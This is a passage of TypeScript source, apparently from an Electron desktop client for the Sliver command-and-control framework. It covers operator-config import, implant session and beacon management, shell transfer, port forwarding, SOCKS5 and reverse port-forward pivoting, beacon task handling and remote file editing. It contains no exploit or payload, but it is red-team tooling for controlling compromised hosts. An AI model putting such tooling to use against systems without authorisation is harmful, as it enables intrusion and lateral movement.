        throw new Error("The preferred managed shell is no longer owned by either managed-shell surface");
      }
      const transferredResourceIds = await this.streams.transferSessionShells(
        sourceBinding,
        destinationBinding,
      );
      destination.activeTarget = current.ref;
      destination.snapshot = this.snapshotForWindow(destination, pool.snapshot);
      this.pushSnapshot(destinationContentsId, destination.snapshot);
      return {
        ok: true,
        value: Object.freeze({
          kind: "session-shell" as const,
          snapshot: destination.snapshot,
          ...(preferredResourceId !== undefined && (
            transferredResourceIds.includes(preferredResourceId) ||
            destinationInventory.resources.some((resource) => resource.resourceId === preferredResourceId)
          )
            ? { preferredResourceId }
            : {}),
        }),
      };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async returnSessionShellWindow(
    sourceContentsId: number,
    sourceRendererProcessId: number,
    sourceRendererFrameToken: string,
    destinationContentsId: number,
    destinationRendererProcessId: number,
    destinationRendererFrameToken: string,
    expectedTarget: TargetRef,
  ): Promise<boolean> {
    try {
      const source = this.requireWindow(sourceContentsId);
      const destination = this.requireWindow(destinationContentsId);
      if (!source.poolKey || source.poolKey !== destination.poolKey) return false;
      const pool = this.pools.get(source.poolKey);
      if (!pool || pool.epoch !== expectedTarget.backendEpoch) return false;
      if (
        !source.activeTarget ||
        !destination.activeTarget ||
        !sameTargetRefIdentity(source.activeTarget, expectedTarget) ||
        !sameTargetRefIdentity(destination.activeTarget, expectedTarget)
      ) return false;
      const current = pool.targetStore.revalidateTargetRef(expectedTarget, pool.epoch);
      if (!current || current.target.mode !== "session" || current.target.liveness !== "active") return false;
      await this.streams.transferSessionShells(
        streamOwnerBinding(
          source,
          pool,
          current.ref,
          sourceRendererProcessId,
          sourceRendererFrameToken,
        ),
        streamOwnerBinding(
          destination,
          pool,
          current.ref,
          destinationRendererProcessId,
          destinationRendererFrameToken,
        ),
      );
      destination.snapshot = this.snapshotForWindow(destination, pool.snapshot);
      this.pushSnapshot(destinationContentsId, destination.snapshot);
      return true;
    } catch {
      return false;
    }
  }

  snapshot(contentsId: number): SliverSnapshot {
    const context = this.requireWindow(contentsId);
    if (!context.poolKey) return context.snapshot;
    const snapshot = this.pools.get(context.poolKey)?.snapshot;
    return snapshot ? this.snapshotForWindow(context, snapshot) : context.snapshot;
  }

  async chooseAndConnect(sender: WebContents): Promise<OperationResult<SliverSnapshot>> {
    const contentsId = sender.id;
    try {
      const owner = requireOwnerWindow(sender);
      const result = await dialog.showOpenDialog(owner, {
        title: "Choose Sliver Operator Config",
        properties: ["openFile"],
        filters: [
          { name: "Sliver operator configs", extensions: ["cfg", "json"] },
          { name: "All files", extensions: ["*"] },
        ],
      });
      const filePath = result.filePaths[0];
      if (result.canceled || !filePath) return { ok: false, error: "Connection canceled" };
      let data: Buffer;
      try {
        data = await readConfigForImport(filePath);
      } catch {
        return { ok: false, error: "Unable to read the selected configuration file" };
      }
      try {
        return await this.connectConfig(
          contentsId,
          data,
          sanitizeSavedConfigMetadata(basename(filePath)),
          Object.freeze({
            path: filePath,
            digest: createHash("sha256").update(data).digest("hex"),
            requirePrivateMode: false,
          }),
        );
      } finally {
        data.fill(0);
      }
    } catch {
      return { ok: false, error: "Unable to read the selected configuration file" };
    }
  }

  async importConfig(sender: WebContents, displayName: string): Promise<OperationResult<SavedConfigSummary>> {
    try {
      const owner = requireOwnerWindow(sender);
      const result = await dialog.showOpenDialog(owner, {
        title: "Import Sliver Operator Config",
        properties: ["openFile"],
        filters: [
          { name: "Sliver operator configs", extensions: ["cfg", "json"] },
          { name: "All files", extensions: ["*"] },
        ],
      });
      const filePath = result.filePaths[0];
      if (result.canceled || !filePath) return { ok: false, error: "Import canceled" };
      const imported = await this.configStore.import(filePath, displayName);
      this.requireWindow(sender.id).savedConfigs.set(imported.summary.id, imported);
      return { ok: true, value: imported.summary };
    } catch (error) {
      if (error instanceof Error && error.message.startsWith("Saved configuration permissions must be private")) {
        return { ok: false, error: "Selected configuration must have private file permissions (0600 or stricter) to import by reference" };
      }
      return { ok: false, error: "Unable to import the selected Sliver configuration" };
    }
  }

  async listSavedConfigs(contentsId: number): Promise<OperationResult<SavedConfigSummary[]>> {
    const context = this.requireWindow(contentsId);
    try {
      const records = await this.configStore.list();
      if (this.windows.get(contentsId) !== context) throw new Error("Application window changed during refresh");
      context.savedConfigs.clear();
      for (const record of records) context.savedConfigs.set(record.summary.id, record);
      return { ok: true, value: records.map((record) => record.summary) };
    } catch {
      context.savedConfigs.clear();
      return { ok: false, error: "Unable to refresh saved Sliver configurations" };
    }
  }

  async removeSavedConfig(contentsId: number, id: string): Promise<OperationResult> {
    const context = this.requireWindow(contentsId);
    const record = context.savedConfigs.get(id);
    if (!record) return { ok: false, error: "Unknown or stale saved configuration selection" };
    try {
      await this.configStore.remove(record);
      context.savedConfigs.delete(id);
      return { ok: true };
    } catch {
      return { ok: false, error: "Unable to remove the selected Sliver configuration" };
    }
  }

  async connectSavedConfig(contentsId: number, id: string): Promise<OperationResult<SliverSnapshot>> {
    const context = this.requireWindow(contentsId);
    const record = typeof id === "string" ? context.savedConfigs.get(id) : undefined;
    if (!record) return { ok: false, error: "Unknown or stale saved configuration selection" };
    const deferredReason = deferredWireGuardResult(record.summary);
    if (deferredReason) return { ok: false, error: deferredReason };

    let data: Buffer;
    try {
      data = await readCurrentSavedConfig(record);
    } catch {
      context.savedConfigs.delete(id);
      return { ok: false, error: "Saved configuration changed or is no longer available; refresh the list" };
    }
    try {
      return await this.connectConfig(
        contentsId,
        data,
        record.summary.displayName,
        Object.freeze({
          path: record.path,
          digest: record.digest,
          requirePrivateMode: record.summary.origin === "imported",
        }),
      );
    } finally {
      data.fill(0);
    }
  }

  async disconnect(contentsId: number): Promise<OperationResult<SliverSnapshot>> {
    const context = this.requireWindow(contentsId);
    await this.streams.closeWindow(contentsId, "backend-disconnected").catch(() => undefined);
    context.connectionAttempt += 1;
    delete context.manualRefresh;
    const poolKey = context.poolKey;
    closeWindowOperationEngine(context);
    delete context.poolKey;
    delete context.configName;
    delete context.activeConfig;
    clearCertificateCapabilities(context);
    context.stopPlans.clear();
    delete context.activeTarget;
    context.beaconWatch = false;
    context.targetPlans.clear();
    this.revokeSessionTargetCapabilities(context);
    this.revokeExecutionState(context);
    context.sessionPlanAdmissions.clear();
    context.targetPageCursors.clear();
    context.snapshot = disconnectedSnapshot();
    this.pushSnapshot(contentsId, context.snapshot);
    if (poolKey) {
      try {
        await this.releasePool(poolKey, contentsId);
      } catch (error) {
        return { ok: false, error: errorMessage(error) };
      }
    }
    return { ok: true, value: context.snapshot };
  }

  /**
   * Re-read the active operator profile through the same bounded, no-symlink
   * boundary used by the saved-config catalog. The retained path and digest
   * remain main-only; a changed profile is never silently used by a console.
   */
  async copyActiveConfig(contentsId: number): Promise<ActiveConfigMaterial> {
    const context = this.requireWindow(contentsId);
    const reference = context.activeConfig;
    const attempt = context.connectionAttempt;
    const poolKey = context.poolKey;
    const pool = poolKey ? this.pools.get(poolKey) : undefined;
    if (!reference || !context.configName || !pool) {
      throw new Error("Connect to a Sliver server before opening its console");
    }
    if (!["connected", "degraded", "reconnecting"].includes(pool.snapshot.connection.status)) {
      throw new Error("The active Sliver connection is not ready for a console");
    }

    const loaded = await readBoundedRegularFile(reference.path, {
      label: "Active configuration",
      maxBytes: MAX_SAVED_CONFIG_BYTES,
      requirePrivateMode: reference.requirePrivateMode,
    });
    const data = loaded.data;
    try {
      const digest = createHash("sha256").update(data).digest("hex");
      if (digest !== reference.digest) throw new Error("The active Sliver configuration changed on disk");
      if (
        this.windows.get(contentsId) !== context ||
        context.connectionAttempt !== attempt ||
        context.poolKey !== poolKey ||
        context.activeConfig !== reference ||
        this.pools.get(poolKey!) !== pool
      ) {
        throw new Error("The active Sliver connection changed while its configuration was being verified");
      }
      return Object.freeze({ configName: context.configName, configBytes: data });
    } catch (error) {
      data.fill(0);
      throw error;
    }
  }

  async refresh(contentsId: number): Promise<OperationResult<SliverSnapshot>> {
    let context: WindowContext;
    try {
      context = this.requireWindow(contentsId);
      const existing = context.manualRefresh;
      if (existing) {
        if (existing.waiters >= MAX_WINDOW_MANUAL_REFRESH_WAITERS) {
          throw new Error("Too many manual refresh callers are already waiting in this window");
        }
        existing.waiters += 1;
        if (!existing.followupStarted) existing.followupRequested = true;
        try {
          return await existing.promise;
        } finally {
          existing.waiters -= 1;
        }
      }
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }

    const state: ManualRefreshState = {
      promise: Promise.resolve({ ok: false, error: "Manual refresh has not started" }),
      waiters: 1,
      followupRequested: false,
      followupStarted: false,
    };
    const run = this.withPool(contentsId, async (pool) => {
      await pool.refreshAll();
      if (state.followupRequested) {
        state.followupStarted = true;
        await pool.refreshAll();
      }
      await this.reconcileWindowOperations(contentsId, "explicit-refresh", true);
      return this.snapshot(contentsId);
    });
    state.promise = run.finally(() => {
      if (context.manualRefresh === state) delete context.manualRefresh;
    });
    context.manualRefresh = state;
    try {
      return await state.promise;
    } finally {
      state.waiters -= 1;
    }
  }

  async listTargets(
    contentsId: number,
    request: TargetCatalogPageRequest,
  ): Promise<OperationResult<TargetCatalogPage>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const limit = request.limit ?? DEFAULT_TARGET_CATALOG_PAGE_SIZE;
      if (!Number.isSafeInteger(limit) || limit < 1 || limit > MAX_TARGET_CATALOG_PAGE_SIZE) {
        throw new Error(`Target catalog page size must be between 1 and ${MAX_TARGET_CATALOG_PAGE_SIZE}`);
      }
      const rawQuery = request.query ?? "";
      if (
        typeof rawQuery !== "string" ||
        rawQuery.length > MAX_TARGET_CATALOG_QUERY_LENGTH ||
        rawQuery.includes("\0")
      ) {
        throw new Error(`Target catalog query must be at most ${MAX_TARGET_CATALOG_QUERY_LENGTH} characters`);
      }
      const query = normalizeTargetCatalogQuery(rawQuery);
      if (query.length > MAX_TARGET_CATALOG_QUERY_LENGTH) {
        throw new Error(`Target catalog query must be at most ${MAX_TARGET_CATALOG_QUERY_LENGTH} characters`);
      }
      let catalogSnapshot: TargetCatalogSnapshot;
      let offset: number;
      if (request.cursor) {
        const continuation = this.consumeTargetPageCursor(context, pool, request.mode, query, request.cursor);
        catalogSnapshot = this.requireTargetCatalogSnapshot(continuation.snapshotKey, pool, request.mode, query);
        offset = continuation.offset;
      } else {
        assertTargetDomainAuthoritative(pool, request.mode);
        catalogSnapshot = this.targetCatalogSnapshot(pool, request.mode, query);
        offset = 0;
      }
      assertBinding();
      const entries = this.targetCatalogEntries(pool, catalogSnapshot, offset, limit);
      const total = catalogSnapshot.identities.length;
      const nextOffset = offset + entries.length;
      const truncated = nextOffset < total;
      const nextCursor = truncated
        ? this.issueTargetPageCursor(context, pool, request.mode, catalogSnapshot.key, total, nextOffset, query)
        : undefined;
      return {
        items: entries,
        page: {
          limit,
          total,
          truncated,
          ...(nextCursor ? { nextCursor } : {}),
        },
      };
    });
  }

  networkContext(contentsId: number): OperationResult<NetworkWindowContext> {
    try {
      const context = this.requireWindow(contentsId);
      const snapshot = this.snapshot(contentsId);
      const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
      const sessionDomain = snapshot.domains.sessions;
      const sessions = pool && (sessionDomain.status === "ready" || sessionDomain.status === "empty")
        ? pool.targetStore.catalogPage("session", 0, Number.MAX_SAFE_INTEGER).items.flatMap((target) => {
            if (target.mode !== "session") return [];
            const ref = pool.targetStore.createTargetRef("session", target.id, pool.epoch);
            return ref ? [{
              session: {
                id: target.id,
                name: target.name,
                hostname: target.hostname,
                username: target.username,
                os: target.os,
                arch: target.arch,
                liveness: target.liveness,
              },
              ref,
            }] : [];
          })
        : [];
      return {
        ok: true,
        value: Object.freeze({
          connection: Object.freeze({ ...snapshot.connection }),
          sessions: Object.freeze({
            status: sessionDomain.status,
            items: Object.freeze(sessions.map(({ session, ref }) => Object.freeze({
              session: Object.freeze({ ...session }),
              ref: Object.freeze({ ...ref }),
            }))),
            ...(sessionDomain.updatedAt ? { updatedAt: sessionDomain.updatedAt } : {}),
            ...(sessionDomain.error ? { error: sessionDomain.error } : {}),
          }),
        }),
      };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async listNetworkForwards(
    contentsId: number,
    input: ListNetworkForwardsInput,
  ): Promise<OperationResult<NetworkForwardingSnapshot>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const reverseTargets = input.reverseTargets?.map((target) => (
        this.requireActiveNetworkSession(pool, target, false)
      ));
      assertBinding();
      return pool.networkForwarding.list(reverseTargets ? { reverseTargets } : {});
    });
  }

  async startNetworkPortForward(
    contentsId: number,
    input: StartPortForwardInput,
  ): Promise<OperationResult<NetworkPortForwardSummary>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const session = this.requireActiveNetworkSession(pool, input.session, true);
      assertBinding();
      return pool.networkForwarding.startPortForward({ ...input, session });
    });
  }

  async stopNetworkPortForward(contentsId: number, id: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      assertBinding();
      await pool.networkForwarding.stopPortForward(id);
    });
  }

  async startNetworkSocks5Proxy(
    contentsId: number,
    input: StartSocks5ProxyInput,
  ): Promise<OperationResult<NetworkSocks5ProxySummary>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const session = this.requireActiveNetworkSession(pool, input.session, true);
      assertBinding();
      return pool.networkForwarding.startSocks5Proxy({ ...input, session });
    });
  }

  async stopNetworkSocks5Proxy(contentsId: number, id: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      assertBinding();
      await pool.networkForwarding.stopSocks5Proxy(id);
    });
  }

  async startNetworkReversePortForward(
    contentsId: number,
    input: StartReversePortForwardInput,
  ): Promise<OperationResult<NetworkReversePortForwardSummary>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const session = this.requireActiveNetworkSession(pool, input.session, true);
      assertBinding();
      return pool.networkForwarding.startReversePortForward({ ...input, session });
    });
  }

  async stopNetworkReversePortForward(
    contentsId: number,
    input: StopReversePortForwardInput,
  ): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      const session = this.requireActiveNetworkSession(pool, input.session, true);
      const inventory = await pool.networkForwarding.list({ reverseTargets: [session] });
      assertBinding();
      if (inventory.reversePortForwards.status !== "ready") {
        throw new Error(
          inventory.reversePortForwards.error ?? "The reverse port forward inventory is unavailable",
        );
      }
      const current = inventory.reversePortForwards.items.find(
        (forward) => forward.listenerId === input.listenerId,
      );
      if (!current) throw new Error("The reverse port forward is no longer active");
      if (
        !sameNetworkAddress(current.bind, input.expectedBind) ||
        !sameNetworkAddress(current.destination, input.expectedDestination)
      ) {
        throw new Error("The reverse port forward changed after it was reviewed; refresh and try again");
      }
      await pool.networkForwarding.stopReversePortForward(session.id, input.listenerId);
    });
  }

  async selectTarget(contentsId: number, target: TargetRef): Promise<OperationResult<SliverSnapshot>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      assertBinding();
      assertTargetDomainAuthoritative(pool, target.mode);
      if (!pool.targetStore.isCurrentTargetRef(target, pool.epoch)) {
        throw new Error("The target selection is stale or no longer available; refresh and select it again");
      }
      const current = pool.targetStore.revalidateTargetRef(target, pool.epoch);
      if (!current) throw new Error("The target is no longer available");
      const context = this.requireWindow(contentsId);
      if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, current.ref)) {
        const closePreviousShells = context.activeTarget?.mode === "session";
        // Change selected-target authority before yielding so an in-flight
        // picker or reviewed-plan preparation cannot commit against the old
        // session while its streams are closing.
        context.activeTarget = current.ref;
        this.revokeSessionTargetCapabilities(context);
        this.revokeExecutionState(context);
        if (closePreviousShells) await this.streams.closeWindow(contentsId, "target-rebound");
      } else {
        context.activeTarget = current.ref;
      }
      if (current.target.mode !== "beacon") {
        context.beaconWatch = false;
        pool.setWindowWatch(contentsId, false);
      }
      context.snapshot = this.snapshotForWindow(context, pool.snapshot);
      this.pushSnapshot(contentsId, context.snapshot);
      return context.snapshot;
    });
  }

  async backgroundTarget(contentsId: number): Promise<OperationResult<SliverSnapshot>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      assertBinding();
      const context = this.requireWindow(contentsId);
      const previousActiveTarget = context.activeTarget;
      if (previousActiveTarget) {
        delete context.activeTarget;
        this.revokeSessionTargetCapabilities(context);
        this.revokeExecutionState(context);
        if (previousActiveTarget.mode === "session") {
          await this.streams.closeWindow(contentsId, "target-rebound");
        }
      }
      context.beaconWatch = false;
      pool.setWindowWatch(contentsId, false);
      context.snapshot = this.snapshotForWindow(context, pool.snapshot);
      this.pushSnapshot(contentsId, context.snapshot);
      return context.snapshot;
    });
  }

  async setBeaconWatch(contentsId: number, enabled: boolean): Promise<OperationResult<SliverSnapshot>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      assertBinding();
      const context = this.requireWindow(contentsId);
      if (!context.activeTarget || context.activeTarget.mode !== "beacon") {
        throw new Error("Select a beacon before changing beacon watch");
      }
      assertTargetDomainAuthoritative(pool, "beacon");
      if (!pool.targetStore.revalidateTargetRef(context.activeTarget, pool.epoch)) {
        throw new Error("The selected beacon is no longer available");
      }
      context.beaconWatch = enabled;
      pool.setWindowWatch(contentsId, enabled);
      context.snapshot = this.snapshotForWindow(context, pool.snapshot);
      this.pushSnapshot(contentsId, context.snapshot);
      return context.snapshot;
    });
  }

  async submitTargetOperation(
    contentsId: number,
    input: TargetOperationInput,
  ): Promise<OperationResult<TargetOperationRecord>> {
    try {
      const context = this.requireWindow(contentsId);
      const poolKey = context.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
      if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) {
        throw new Error("Connect to a Sliver server first");
      }
      const epoch = pool.epoch;
      const attempt = context.connectionAttempt;
      const bindingCurrent = (): boolean =>
        this.windows.get(contentsId) === context &&
        context.poolKey === poolKey &&
        context.connectionAttempt === attempt &&
        this.pools.get(poolKey!) === pool &&
        pool.epoch === epoch;
      const engine = this.requireOperationEngine(contentsId, context, pool);
      if (!bindingCurrent()) throw new Error("The backend connection changed before operation submission");
      const operation = await engine.submit(input);
      if (bindingCurrent() && operation.taskId) {
        this.pushBeaconTasksInvalidated(contentsId, operation.target);
        this.ensureOperationReconciliation(contentsId);
      }
      return { ok: true, value: operation };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async prepareBeaconMutation(
    contentsId: number,
    input: BeaconMutationOperationInput,
  ): Promise<OperationResult<BeaconMutationPlan>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const engine = this.requireOperationEngine(contentsId, context, pool);
      const plan = await engine.prepareBeaconMutation(input);
      assertBinding();
      return plan;
    });
  }

  async executeBeaconMutation(
    contentsId: number,
    token: string,
  ): Promise<OperationResult<TargetOperationRecord>> {
    try {
      const context = this.requireWindow(contentsId);
      const poolKey = context.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      if (!pool || !new Set(["connected", "degraded", "reconnecting"]).has(pool.snapshot.connection.status)) {
        throw new Error("Connect to a Sliver server first");
      }
      const epoch = pool.epoch;
      const attempt = context.connectionAttempt;
      const bindingCurrent = (): boolean =>
        this.windows.get(contentsId) === context && context.poolKey === poolKey &&
        context.connectionAttempt === attempt && this.pools.get(poolKey!) === pool && pool.epoch === epoch;
      const engine = this.requireOperationEngine(contentsId, context, pool);
      if (!bindingCurrent()) throw new Error("The backend connection changed before mutation dispatch");
      const operation = await engine.executeBeaconMutation(token);
      if (bindingCurrent() && operation.taskId) {
        this.pushBeaconTasksInvalidated(contentsId, operation.target);
        this.ensureOperationReconciliation(contentsId);
      }
      return { ok: true, value: operation };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async discardBeaconMutation(contentsId: number, token: string): Promise<OperationResult> {
    try {
      this.requireWindow(contentsId).operationEngine?.discardBeaconMutation(token);
      return { ok: true };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async listTargetOperations(
    contentsId: number,
    request: OperationPageRequest,
  ): Promise<OperationResult<TargetOperationPage>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const engine = this.requireOperationEngine(contentsId, context, pool);
      assertBinding();
      return engine.list(request);
    });
  }

  async getTargetOperation(
    contentsId: number,
    requestId: string,
  ): Promise<OperationResult<TargetOperationRecord>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const operation = this.requireOperationEngine(contentsId, context, pool).get(requestId);
      assertBinding();
      if (!operation) throw new Error("Unknown operation for this application window");
      return operation;
    });
  }

  async cancelTargetOperation(
    contentsId: number,
    requestId: string,
  ): Promise<OperationResult<TargetOperationRecord>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const context = this.requireWindow(contentsId);
      const engine = this.requireOperationEngine(contentsId, context, pool);
      const operation = await engine.cancel(requestId);
      assertBinding();
      if (operation.taskId) {
        this.pushBeaconTasksInvalidated(contentsId, operation.target);
        this.ensureOperationReconciliation(contentsId);
      }
      return operation;
    });
  }

  async listBeaconTasks(
    contentsId: number,
    request: OperationPageRequest,
  ): Promise<OperationResult<BeaconTaskPage>> {
    let admittedContext: WindowContext | undefined;
    const admissionId = randomUUID();
    try {
      if (!request.cursor) {
        const context = this.requireWindow(contentsId);
        if (context.taskListAdmissions.size >= MAX_WINDOW_TASK_LIST_REQUESTS) {
          throw new Error("Too many beacon task inventories are already being loaded in this window");
        }
        context.taskListAdmissions.add(admissionId);
        admittedContext = context;
      }
      return await this.withPool(contentsId, async (pool, assertBinding) => {
        const { context, target } = this.requireSelectedBeacon(contentsId, pool);
        const selectedTarget = target.ref;
        const assertSelectedTarget = (): void => {
          if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedTarget)) {
            throw new Error("The selected beacon changed while its task inventory was loading");
          }
        };
        if (!request.cursor) {
          await pool.beaconTasks.refresh(
            target.target.id,
            localTaskIdsForBeacon(context, target.target.id),
            pool.recoverableTaskIdsForBeacon(target.target.id),
          );
          assertBinding();
          assertSelectedTarget();
        }
        assertSelectedTarget();
        const page = pool.beaconTasks.list(
          target.target.id,
          request,
          this.taskOwnershipResolver(context),
          {
            ownerKey: `${pool.epoch}:${contentsId}`,
            accessKey: `${pool.epoch}:${contentsId}:${context.connectionAttempt}`,
          },
        );
        assertSelectedTarget();
        return page;
      });
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      admittedContext?.taskListAdmissions.delete(admissionId);
    }
  }

  async getBeaconTask(
    contentsId: number,
    taskId: string,
  ): Promise<OperationResult<BeaconTaskDetail>> {
    let context: WindowContext;
    try {
      context = this.requireWindow(contentsId);
      if (context.taskDetailAdmissions.size >= MAX_WINDOW_TASK_DETAIL_REQUESTS) {
        throw new Error("Too many beacon task details are already being fetched in this window");
      }
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
    const admissionId = randomUUID();
    context.taskDetailAdmissions.add(admissionId);
    try {
      return await this.withPool(contentsId, async (pool, assertBinding) => {
        const { context, target } = this.requireSelectedBeacon(contentsId, pool);
        const selectedTarget = target.ref;
        const assertSelectedTarget = (): void => {
          if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedTarget)) {
            throw new Error("The selected beacon changed while its task detail was loading");
          }
        };
        await pool.beaconTasks.refresh(
          target.target.id,
          [taskId, ...localTaskIdsForBeacon(context, target.target.id)],
          pool.recoverableTaskIdsForBeacon(target.target.id),
        );
        assertBinding();
        assertSelectedTarget();
        const detail = await pool.beaconTasks.detail(
          target.target.id,
          taskId,
          this.taskOwnershipResolver(context),
        );
        assertBinding();
        assertSelectedTarget();
        await this.reconcileOperationFromTask(this.requireOperationEngine(contentsId, context, pool), detail);
        return detail;
      });
    } finally {
      context.taskDetailAdmissions.delete(admissionId);
    }
  }

  async getBeaconTaskResponse(
    contentsId: number,
    taskId: string,
    offset = 0,
  ): Promise<OperationResult<BeaconTaskResponse>> {
    let admittedContext: WindowContext | undefined;
    const admissionId = randomUUID();
    try {
      const context = this.requireWindow(contentsId);
      if (context.taskDetailAdmissions.size >= MAX_WINDOW_TASK_DETAIL_REQUESTS) {
        throw new Error("Too many beacon task details are already being fetched in this window");
      }
      context.taskDetailAdmissions.add(admissionId);
      admittedContext = context;
      return await this.withPool(contentsId, async (pool, assertBinding) => {
        const { target } = this.requireSelectedBeacon(contentsId, pool);
        const selectedTarget = target.ref;
        const assertSelectedTarget = (): void => {
          assertBinding();
          if (!context.activeTarget || !sameTargetRefIdentity(context.activeTarget, selectedTarget)) {
            throw new Error("The selected beacon changed while its task response was loading");
          }
        };
        await pool.beaconTasks.refresh(
          target.target.id,
          [taskId, ...localTaskIdsForBeacon(context, target.target.id)],
          pool.recoverableTaskIdsForBeacon(target.target.id),
        );
        assertSelectedTarget();
        const response = await pool.beaconTasks.response(
          target.target.id,
          taskId,
          offset,
          this.taskOwnershipResolver(context),
        );
        assertSelectedTarget();
        return response;
      });
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      admittedContext?.taskDetailAdmissions.delete(admissionId);
    }
  }

  async cancelBeaconTask(
    contentsId: number,
    taskId: string,
  ): Promise<OperationResult<BeaconTaskSummary>> {
    let admittedContext: WindowContext | undefined;
    const admissionId = randomUUID();
    try {
      const windowContext = this.requireWindow(contentsId);
      if (windowContext.taskCancelAdmissions.size >= MAX_WINDOW_TASK_CANCEL_REQUESTS) {
        throw new Error("Too many beacon task cancellations are already in flight in this window");
      }
      windowContext.taskCancelAdmissions.add(admissionId);
      admittedContext = windowContext;
      const poolKey = windowContext.poolKey;
      const pool = poolKey ? this.pools.get(poolKey) : undefined;
      const usableStatuses = new Set(["connected", "degraded", "reconnecting"]);
      if (!pool || !usableStatuses.has(pool.snapshot.connection.status)) {
        throw new Error("Connect to a Sliver server first");
      }
      const epoch = pool.epoch;
      const attempt = windowContext.connectionAttempt;
      const bindingCurrent = (): boolean =>
        this.windows.get(contentsId) === windowContext &&
        windowContext.poolKey === poolKey &&
        windowContext.connectionAttempt === attempt &&
        this.pools.get(poolKey!) === pool &&
        pool.epoch === epoch;
      const poolCurrent = (): boolean => this.pools.get(pool.key) === pool && pool.epoch === epoch;
      const { context, target } = this.requireSelectedBeacon(contentsId, pool);
      const selectedTarget = target.ref;
      const selectionCurrent = (): boolean =>
        Boolean(context.activeTarget && sameTargetRefIdentity(context.activeTarget, selectedTarget));
      const engine = this.requireOperationEngine(contentsId, context, pool);
      const resolveOwnership = this.taskOwnershipResolver(context);
      const cancelCapability = targetCapability(
        calculatePoolTargetCapabilities(pool, target.target),
        "beacon.tasks.cancel",
      );
      if (!cancelCapability.available) {
        throw new Error(cancelCapability.reason?.message ?? "Beacon task cancellation is unavailable");
      }
      await pool.beaconTasks.refresh(
        target.target.id,
        [taskId, ...localTaskIdsForBeacon(context, target.target.id)],
        pool.recoverableTaskIdsForBeacon(target.target.id),
      );
      if (!bindingCurrent() || !selectionCurrent()) {
        throw new Error("The backend or selected beacon changed before task cancellation");
      }
      const preflightTask = pool.beaconTasks.task(target.target.id, taskId, resolveOwnership);
      if (preflightTask.state !== "pending") {
        await this.reconcileOperationFromTask(
          engine,
          await this.verifiedTaskForReconciliation(pool, preflightTask, resolveOwnership),
        );
        if (!bindingCurrent() || !selectionCurrent()) {
          return {
            ok: false,
            error: "The task state was confirmed for the previously selected backend target; refresh the current task inventory",
          };
        }
        return { ok: true, value: preflightTask };
      }
      const cancellationState = preflightTask.cancellation;
      if (!cancellationState.available) {
        throw new Error(cancellationState.reason ?? "This beacon task is not safe to cancel");
      }

      let confirmed: BeaconTaskSummary | undefined;
      try {
        confirmed = await pool.beaconTasks.cancel(target.target.id, taskId, resolveOwnership);
      } catch (error) {
        if (error instanceof BeaconTaskCancellationError && !error.dispatchStarted) throw error;
        // Cancellation is one-shot. A lost response must be reconciled from
        // authoritative task state and must never replay the cancel request.
      }

      if (confirmed) {
        await this.reconcileOperationFromTask(
          engine,
          await this.verifiedTaskForReconciliation(pool, confirmed, resolveOwnership),
        );
      }
      if (poolCurrent()) {
        try {
          await pool.beaconTasks.refresh(
            target.target.id,
            [taskId, ...localTaskIdsForBeacon(context, target.target.id)],
            pool.recoverableTaskIdsForBeacon(target.target.id),
          );
          const refreshed = pool.beaconTasks.task(target.target.id, taskId, resolveOwnership);
          if (refreshed.state !== "pending") {
            confirmed = refreshed;
            await this.reconcileOperationFromTask(
              engine,
              await this.verifiedTaskForReconciliation(pool, refreshed, resolveOwnership),
            );
          }
        } catch {
          // An exact cancel response remains authoritative even if the
          // follow-up inventory refresh is temporarily unavailable.
        }
      }
      if (!confirmed) {
        throw new Error("Task cancellation was dispatched, but its outcome could not be confirmed; refresh the task inventory");
      }
      if (!bindingCurrent() || !selectionCurrent()) {
        return {
          ok: false,
          error: "Task cancellation was confirmed for the previously selected backend target; refresh the current task inventory",
        };
      }
      this.pushBeaconTasksInvalidated(contentsId, target.ref);
      return { ok: true, value: confirmed };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    } finally {
      admittedContext?.taskCancelAdmissions.delete(admissionId);
    }
  }

  async runSessionWorkbench(
    sender: WebContents,
    input: SessionWorkbenchInput,
  ): Promise<OperationResult<SessionWorkbenchInvocationResult>> {
    return this.runSessionWorkbenchWithUploadSource(sender, input);
  }

  /** Open the exact selected session's complete UTF-8 file in a main-owned editor. */
  async loadRemoteTextEditor(
    owner: WebContents,
    remotePath: string,
  ): Promise<{ title: string; text: string; expectedSha256: string; binding: unknown }> {
    const frame = owner.mainFrame;
